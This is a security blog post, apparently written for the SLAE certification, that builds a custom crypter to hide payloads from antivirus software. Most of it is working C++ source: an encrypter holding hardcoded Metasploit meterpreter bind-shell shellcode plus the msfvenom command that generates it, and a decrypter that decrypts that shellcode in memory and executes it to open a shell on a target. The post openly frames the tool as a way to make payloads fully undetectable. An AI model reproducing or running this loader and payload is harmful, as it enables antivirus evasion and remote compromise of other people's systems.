---
title: 'SLAE: Custom Crypter (Linux/x86)'
categories:
- Certifications
---
Do you want to fool antivirus software? When you look through hacking forums for a solution to this, you will likely encounter the term "crypter". You will also find this tool in the arsenal of every advanced penetration tester and it is the obvious standard for an advanced persistent threat (APT). This blog post gives you some insights about crypters and finalizes my SecurityTube Linux Assembly Expert (SLAE) certification. The task was to:

*   Create a custom crypter
*   Use any existing encryption schema (including own)
*   Use any programming language

But before digging into the technical details of my crypter, let's first discuss the basics.

### What is a crypter?

Basically the term "crypter" is derived from "encryption", which means its purpose is to encrypt and decrypt a specific payload using a cryptographic encryption algorithm like 3DES, AES, CAMELLIA or even RSA. So why do you encrypt things? Because you don't want them to be read, which means you want to primarily secure its confidentiality (with some encryption algorithms like AES-GCM you secure the integrity as well). Basically, this principle also applies to a crypter - its main purpose is to conceal the real identity and functionality of a payload from antivirus software (henceforth referred to as "AV").

AV software (just like provided by Avira, Kasperky or Bitdefender) uses mostly a signature-based approach. This means all AV vendors maintain a database of virus signatures, which is built from detected viruses and specific patterns found in them. If such a pattern is detected by an AV, the file is marked as a virus. This principle is extended by some heuristic techniques aimed to detect new viruses as well as variants of existing ones by simulating what happen upon execution of a malicious file.

Therefore to bypass these signature-based AVs and make the crypter "FUD" (fully undetectable), crypters are a widely used approach. A list of crypter techniques can be found on [malwarebytes.org.](https://blog.malwarebytes.org/threat-analysis/2015/12/malware-crypters-the-deceptive-first-layer/)

### Choosing an encryption cipher and programming language

As a personal goal, I wanted to do something different than all other SLAE students have done so far. After having a quick look at blog posts of some other student's about this assignment, I decided to go the following way:

*   Use Camellia as an encryption algorithm
*   Use C++ as the programming language
*   Use the Crypto++ library to keep the wheel invented

### Camellia-256-CBC

[Camellia](https://www.ietf.org/rfc/rfc3713.txt) was developed by Misubishi Electric and NTT Japan and is a symmetric key block cipher such as AES. Although it is not widely used but part of the offered TLS ciphers-suites, it is has the security levels comparable to AES. It has a block size of 128 bits and key sizes of either 128, 192 or 256 bits. It supports modes, such as Cipher Block Chaining (CBC) and authenticated encryption using Galois Counter Mode (GCM). I'm not going to dig into how that cipher is working internally as it is highly mathematical and reserved for universities ;-)

For this assignment, I've chosen to use the CBC mode and the 256 bit-key variant, which means that the encryption key is 32 bytes strong. Although the authenticated GCM mode is stronger than the CBC mode (which has [known weaknesses](https://blog.cloudflare.com/padding-oracles-and-the-decline-of-cbc-mode-ciphersuites/)), it does not add any additional security here.

[Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation) supplied a really nice graph describing encryption using the CBC mode:

[![601px-CBC_encryption.svg]({{ site.baseurl }}/assets/601px-CBC_encryption.svg_.png)]({{ site.baseurl }}/assets/601px-CBC_encryption.svg_.png)

With CBC mode each plaintext block of 128bit (16 bytes) is first XORed with the previous cipher-text. Except the first block, which obviously does not have a preceding block, is XORed with a random Initialization Vector (IV). After XORing, the encryption algorithm is applied to the XORed block using the 256bit key and outputs an encrypted block of the same size. Since this is repeated until the end of the plaintext string, this clearly shows that the plaintext string must be a multiple of the block size. If the plaintext does not meet this requirement, the plaintext is filled up using a padding.

Nearly the same schema is applied to the decryption part:

[![601px-CBC_decryption.svg]({{ site.baseurl }}/assets/601px-CBC_decryption.svg_.png)]({{ site.baseurl }}/assets/601px-CBC_decryption.svg_.png)

### The crypter.cpp

As I have mentioned before, my whole crypter and my corresponding decrypter are based on the excellent [Crypto++ library](https://www.cryptopp.com/), which also brings some very good explanatory examples of code. So here's the first part of my crypter - the idea is to generate a random Key and IV to encrypt the supplied payload and output each value hex-encoded to the console to take it up again later. The crypter includes a predefined 5-round shikata_ga_nai encoded Metasploit meterpreter bind payload, which was previously generated using msfvenom:

[![slae-7-0]({{ site.baseurl }}/assets/slae-7-0.png)]({{ site.baseurl }}/assets/slae-7-0.png)

The source code of my crypter is commented inline for a better understanding:

{% highlight cpp %}
/* 
 * Title:    Custom Crypter (crypter.cpp)
 * Platform: Linux/x86
 * Date:     2015-04-28
 * Author:   Julien Ahrens (@MrTuxracer)
 * Website:  https://www.rcesecurity.com 
 * Based on: https://www.cryptopp.com/wiki/Camellia
 *
 * Instructions:
 * Compile using (on x64):
 * g++ -I/usr/include/cryptopp crypter.cpp -o crypter -lcryptopp -m32
*/

#include "osrng.h"
using CryptoPP::AutoSeededRandomPool;

#include <iostream>
using std::cout;
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "cryptlib.h"
using CryptoPP::Exception;

#include "hex.h"
using CryptoPP::HexEncoder;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "camellia.h"
using CryptoPP::Camellia;

#include "modes.h"
using CryptoPP::CBC_Mode;

#include "secblock.h"
using CryptoPP::SecByteBlock;

/*
 * Set the the payload! Key and IV will be generated randomly
 * Make sure the payload is free of NULL bytes, otherwise the crypter will break 
 * 
 * Example payload:
 * msfvenom -e x86/shikata_ga_nai -i 5 -p linux/x86/meterpreter/bind_tcp LPORT=1337 R | hexdump -v -e '"\\x" 1/1 "%02x"'
*/
string payload = "\xb8\xbe\x32\x43\x9c\xdb\xc5\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1\x37\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x5c\xc7\x9a\x70\x18\x01\xb2\xc5\x6e\x8b\xb8\xf1\x7a\x70\x68\x33\x33\xb7\x5b\x80\x29\xbb\xd8\x1c\xce\x78\xda\xc2\x0c\x6b\xf3\xad\x58\xe8\x80\xb6\x71\xe4\xc0\xd5\xc8\xdb\x61\x1b\x39\x78\xcc\x59\x6f\x72\x10\xde\x17\x17\x58\x7b\x91\x2d\xbc\x3e\xd8\x90\xf5\x81\xc4\x0f\x78\x1c\x34\xc3\x1f\x86\x93\xdb\x7e\x9c\xf7\xc4\x02\x26\xea\xf2\xd6\x13\x57\x60\x48\xab\xf5\x29\xc9\x4a\x0d\x32\xb2\x60\x83\x7c\xf6\x48\xa5\x72\x0f\x47\xf0\xb6\xeb\xad\x9e\xd8\x02\x56\xcc\x71\x13\x26\x6d\x80\xd8\xbb\xe0\x05\x2b\xe0\xbd\x53\xf5\x65\x7c\xb5\x44\x11\x1e\xe5\x3d\xcb\x3e\x16\xcb\xe9\xca\xa4\x2e\x1e\x27\xda\x5b\xe0\x31\x91\x06\x34\xb4\xa7\x4e\xe9\x91\xf9\xae\x76\x9a\xb7\xd6\x0a\x1e\x33\x88\xe8\xf9\x23\x89\x5e\x34\x99\x64\x58\xfa\xce\x97\xa3\x8b\xff\x2a\xeb\xdc\xd7\xa1\x18\x1d\xb9\x2a\xce\x9f\x02\xc6\x77\x77\xb1\x2a\x49\x9f\xb1\xe3\x09\x07\xcc\x36\x53\x0e\xfc\x58\x5a\xd7\x08\x0a\xa4\x62\x8e\x45\x30";

/*
 * Function to encode strings using CryptoPP's HexEncoder to a StringSink
 * input("decoded") is encoded to output("encoded")
 * pumpAll is set to true to get the whole data at once
*/
string encode(unsigned char *decoded, int size)
{
	string encoded;   
	StringSource(decoded, size, true,
		new HexEncoder(
			new StringSink(encoded)
		) 
	); 
	return encoded;
}

int main(int argc, char* argv[]) {
	// Init pseudo random number generator
	AutoSeededRandomPool prng;

	// Generate key with 32 bytes
	SecByteBlock key(Camellia::MAX_KEYLENGTH);
	prng.GenerateBlock(key, key.size());
	// Dump key
	cout << "Key: " << encode(key, key.size()) << endl;

	// Generate IV with 16 bytes
	byte iv[Camellia::BLOCKSIZE];
	prng.GenerateBlock(iv, sizeof(iv));
	// Dump iv	
	cout << "IV: " << encode(iv, sizeof(iv)) << endl;

    /*
     * Start encryption
    */    
    try
	{
		// Cipher will contain the encrypted payload later
		string cipher;

		// Use Camellia with CBC mode
		CBC_Mode< Camellia >::Encryption e;
		// Initialize encryption parameters key and iv
		e.SetKeyWithIV(key, key.size(), iv);

		// The StreamTransformationFilter adds padding
		// as required. ECB and CBC Mode must be padded
		// to the block size of the cipher.
		StringSource(payload, true, 
			new StreamTransformationFilter(e,
				new StringSink(cipher)
			)    
		); 

		// Dump cipher text
		string encoded_cipher;
		StringSource(cipher, true,
			new HexEncoder(
				new StringSink(encoded_cipher)
			) 
		); 
		cout << "Ciphertext: " << encoded_cipher << endl;
	}
	// Catch exceptions if they occur during encryption
	catch(const CryptoPP::Exception& e)
	{
		cerr << e.what() << endl;
		exit(1);
	}

    return 0;
}
{% endhighlight %}

The crypter can be compiled on a x64 system using:

{% highlight bash %}
g++ -I/usr/include/cryptopp crypter.cpp -o crypter -lcryptopp -m32
{% endhighlight %}

When executed it outputs all the previously discussed values needed for decryption of the payload:

[![slae-7-1]({{ site.baseurl }}/assets/slae-7-1.png)]({{ site.baseurl }}/assets/slae-7-1.png)

### The decrypter.cpp

Since crypter.cpp does only encrypt the payload, a separate decrypter needs to take up the key, IV and ciphertext, which was generated by the crypte, decrypt it in memory and execute the final payload on the target system:

{% highlight cpp %}
/* 
 * Title:    Custom Crypter (decrypter.cpp)
 * Platform: Linux/x86
 * Date:     2015-04-28
 * Author:   Julien Ahrens (@MrTuxracer)
 * Website:  https://www.rcesecurity.com 
 * Based on: https://www.cryptopp.com/wiki/Camellia
 *
 * Instructions:
 * Compile using (on x64):
 * g++ -I/usr/include/cryptopp decrypter.cpp -m32 -o decrypter -lcryptopp -fno-stack-protector -z execstack
*/

#include <string.h>

#include <iostream>
using std::cerr;
using std::endl;

#include <string>
using std::string;

#include <cstdlib>
using std::exit;

#include "cryptlib.h"
using CryptoPP::Exception;

#include "hex.h"
using CryptoPP::HexDecoder;

#include "filters.h"
using CryptoPP::StringSink;
using CryptoPP::StringSource;
using CryptoPP::StreamTransformationFilter;

#include "camellia.h"
using CryptoPP::Camellia;

#include "modes.h"
using CryptoPP::CBC_Mode;

/*
 * Set decryption parameters
 * ciphertext - contains the hex-encoded encrypted ciphertxt generated by crypter.cpp
 * key - contains the encryption key
 * iv - contains the encryption initialization vector (IV)
*/
string key="93CF010790B98320AFB80CD4379F61A13ED42149E2AC5F97C0D64B174AE9D175";
string iv="15F9231F2A7E9857FED744B4E2ED4727";
string ciphertext="B168876255FFB588193F9AE76B7D0E04C1A084CEAF08F2AE20908D67017D1EA4394E1BF042A2347D5C9F2001E635FA9121646757122EF543F59D6D61C091A4CD66AA5D9379ADB306BA8A092D0803D6749AE4661720FBF5963733E4C280F587B2B29AC0DBF5BEBF4BBD5DDBFFAC0895307E858839DEFC6CE318D1F5C37BE6F06E7F78DECCF40D4883E89E27BBE430A3EE930DB79A4D66837AF01BA5A0992056DFEF0A5D6ECB366422A35DB0FCBFEF10CC5A70679F7C650D63F68FF82D0B0CFC86F1AC2FA3EA740CBF58D3CE2123B13C20D6ADD0D93BA208C671F2EBF170DB34658A96A3BDC2F5A83069A2804E8BC5B02F518C8B076DC4C9AA80A95D01EE3555DF";

/*
 * Function to decode strings using CryptoPP's HexDecoder to a StringSink
 * input("encoded") is decoded to output("decoded")
 * pumpAll is set to true to get the whole data at once
*/
string decode(const string &encoded)
{
	string decoded;   
	StringSource ssrc(encoded, true,
		new HexDecoder(
			new StringSink(decoded)
		) 
	);
	return decoded;
}

int main(int argc, char* argv[]) {
	// Decode ciphertext, key and IV
	string decoded_cipher = decode(ciphertext);
	string decoded_key = decode(key);	
	string decoded_iv = decode(iv);	

	// Convert the key and IV StringSink to const byte * because it's later needed in SetKeyWithIV()
	const byte* b_decoded_key = (const byte*) decoded_key.data();
	const byte* b_decoded_iv = (const byte*) decoded_iv.data();

	// String to store the decrypted contents to
	string recovered;

	// To make sure that CryptoPP exceptions are catched
 	try
	{
		// Set encryption cipher (Camellia with CBC mode)
		CBC_Mode< Camellia >::Decryption d;
		// Set encryption parameters (Key and IV)
		d.SetKeyWithIV(b_decoded_key, Camellia::MAX_KEYLENGTH, b_decoded_iv);

		// Process with encryption and output decrypted string to "recovered"
		// (The StreamTransformationFilter removes padding as required)
		StringSource s(decoded_cipher, true, 
			new StreamTransformationFilter(d,
				new StringSink(recovered)
			) 
		); 
	}
	// Catch exceptions if they occur during decryption
	catch(const CryptoPP::Exception& e)
	{
		cerr << e.what() << endl;
		exit(1);
	}

	// Convert the decoded data to a char
	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);

	// Execute the shellcode
	int (*ret)() = (int(*)())writable;
	ret();

    return 0;
}
{% endhighlight %}

When the decrypter is executed on a target machine, it performs its intended action and opens a meterpreter bind shell:

[![slae-7-2]({{ site.baseurl }}/assets/slae-7-2.png)]({{ site.baseurl }}/assets/slae-7-2.png)

Et voila, the crypter is working! :-)

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

[<span style="color: #2f2f2f;">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</span>](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE- 497
